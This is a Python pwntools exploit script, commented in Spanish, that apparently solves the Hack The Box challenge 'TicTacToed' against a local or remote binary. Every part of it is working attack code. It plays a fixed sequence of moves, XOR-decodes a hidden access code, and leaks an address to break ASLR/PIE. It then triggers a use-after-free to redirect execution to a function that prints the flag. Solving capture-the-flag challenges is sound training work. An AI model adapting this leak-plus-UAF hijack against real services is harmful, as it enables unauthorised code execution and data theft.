#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.10"
# dependencies = ["pwntools"]
# ///
"""
TicTacToed

    uv run full.py                          # local (ejecuta ./tictactoe)
    uv run full.py --host IP:PUERTO         # remoto
    uv run full.py --help

"""

import argparse
import os

from pwn import context, p64, process, remote

# --- movimientos, en el orden exacto que valida obfuscate_pattern ----------
MOVES = ["0 0", "0 4", "1 1", "1 3", "2 2", "3 1", "3 3", "4 0", "4 4"]

# --- partes cifradas que decrypt_key descifra con XOR ----------------------
XOR_KEY = 0x5A
XOR_PARTS = ["1e693c6b34692e", "36233b6d6b396d", "6e396d6a693d3b3769"]

USER = "mau"  # el menú C2 no lo valida

GEN = 0x143C  # prod: 0x13FD
GET = 0x1269  # prod: 0x125D

BINARY = "tictactoe"  # binario local cuando no se pasa --host


def access_code() -> str:
    """XOR de cada byte de las 3 partes -> access code."""
    return "".join(
        chr(b ^ XOR_KEY) for part in XOR_PARTS for b in bytes.fromhex(part)
    )


def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit de TicTacToed.")
    parser.add_argument("--host", help="host:puerto del servicio remoto")
    parser.add_argument("--gen", type=lambda v: int(v, 0), default=GEN,
                        help=f"offset de generateUserID (def. {GEN:#x})")
    parser.add_argument("--get", type=lambda v: int(v, 0), default=GET,
                        help=f"offset de getSecret (def. {GET:#x})")
    args = parser.parse_args()

    if args.host:
        host, _, port = args.host.partition(":")
        io = remote(host, int(port))
    else:
        binary = os.path.join(os.path.dirname(os.path.abspath(__file__)), BINARY)
        io = process(binary, cwd=os.path.dirname(binary))

    code = access_code()
    io.info(f"access code: {code}")

    # 1) partida
    for move in MOVES:
        io.sendlineafter(b"(0-4):", move.encode())

    # 2) credenciales -> menú del C2 (el "> " final queda consumido)
    io.sendlineafter(b"Enter Username:", USER.encode())
    io.sendlineafter(b"Enter Access Code:", code.encode())
    io.recvuntil(b"> ")

    # 3) opción H: fuga generateUserID -> base de carga (rompe ASLR/PIE)
    io.sendline(b"H")
    io.recvuntil(b"User ID: ")
    leak = int(io.recvline().strip(), 16)
    target = leak - args.gen + args.get
    io.info(f"leak={leak:#x}  getSecret={target:#x}")

    # 4) UAF: E libera agent, F reusa ese bloque y read(8) escribe la dirección
    io.sendline(b"E")
    io.recvuntil(b"(Y/N)? ")
    io.sendline(b"Y")
    io.recvuntil(b"> ")
    io.sendline(b"F")
    io.recvuntil(b"hack go?")
    io.send(p64(target))

    # 5) getSecret imprime flag.txt
    try:
        data = io.recvuntil(b"> ", timeout=2)
    except EOFError:
        data = b""

    # El binario C2 no termina al desconectar: una opción inválida lo mata.
    # Sin esto queda huérfano y la siguiente partida falla con "Text file busy".
    try:
        io.sendline(b"Z")
    except EOFError:
        pass

    # La flag se imprime sin salto de línea, así que puede venir pegada al
    # menú: se busca dentro de todo lo recibido, no en una línea suelta.
    text = (data + io.recvall(timeout=1)).decode(errors="replace")
    start, end = text.find("HTB{"), text.find("}")
    if start != -1 and end > start:
        io.success(f"FLAG: {text[start:end + 1]}")
    else:
        io.failure("no se encontró la flag")
        print(text.strip() or "(sin salida)")


if __name__ == "__main__":
    main()
